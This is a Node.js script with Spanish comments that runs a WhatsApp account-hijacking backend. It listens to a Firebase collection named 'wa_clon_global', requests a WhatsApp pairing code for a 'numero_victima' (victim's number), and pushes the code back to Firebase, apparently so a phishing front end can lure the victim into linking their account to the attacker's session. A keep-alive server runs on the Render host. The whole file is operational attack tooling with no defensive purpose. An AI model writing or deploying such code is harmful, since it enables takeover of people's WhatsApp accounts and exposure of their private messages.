const { Client, LocalAuth } = require('whatsapp-web.js');
const admin = require('firebase-admin');
const http = require('http');

// CONFIGURACIÓN FIREBASE
const serviceAccount = require("./serviceAccountKey.json"); 
if (!admin.apps.length) { admin.initializeApp({ credential: admin.credential.cert(serviceAccount) }); }
const db = admin.firestore();

// EL ROBOT SE INICIALIZA UNA SOLA VEZ Y SE QUEDA DESPIERTO
const client = new Client({
    authStrategy: new LocalAuth({ clientId: "master_session" }),
    puppeteer: {
        headless: true,
        args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--single-process']
    }
});

async function procesarPeticion(snap) {
    if (!snap.exists) return;
    const data = snap.data();
    
    // Solo actuamos si se solicita código y no hay uno previo guardado
    if (data.status === "solicitando_codigo" && !data.pairingCode) {
        console.log(">>> SOLICITANDO CÓDIGO PARA: " + data.numero_victima);
        try {
            // Pedimos el pairing code a WhatsApp (aquí es donde ocurre la magia)
            const code = await client.requestPairingCode(data.numero_victima);
            console.log(">>> CÓDIGO GENERADO: " + code);
            
            // Subimos el código a Firebase de inmediato
            await snap.ref.update({
                pairingCode: code,
                status: "mostrando_codigo"
            });
        } catch (err) {
            console.log(">>> ERROR: " + err.message);
            await snap.ref.update({ status: "error" });
        }
    }
}

// ESCUCHA EN TIEMPO REAL (Fuego rápido)
db.collection("wa_clon_global").doc("current_session").onSnapshot(procesarPeticion);

client.on('ready', () => {
    console.log(">>> MOTOR LISTO Y VINCULADO");
});

// Arrancar motor de WhatsApp
client.initialize();

// SERVIDOR PARA QUE RENDER NO DUERMA AL ROBOT
const port = process.env.PORT || 3000;
http.createServer((req, res) => {
    res.end('MOTOR ONLINE');
}).listen(port, () => console.log("Servidor en puerto " + port));
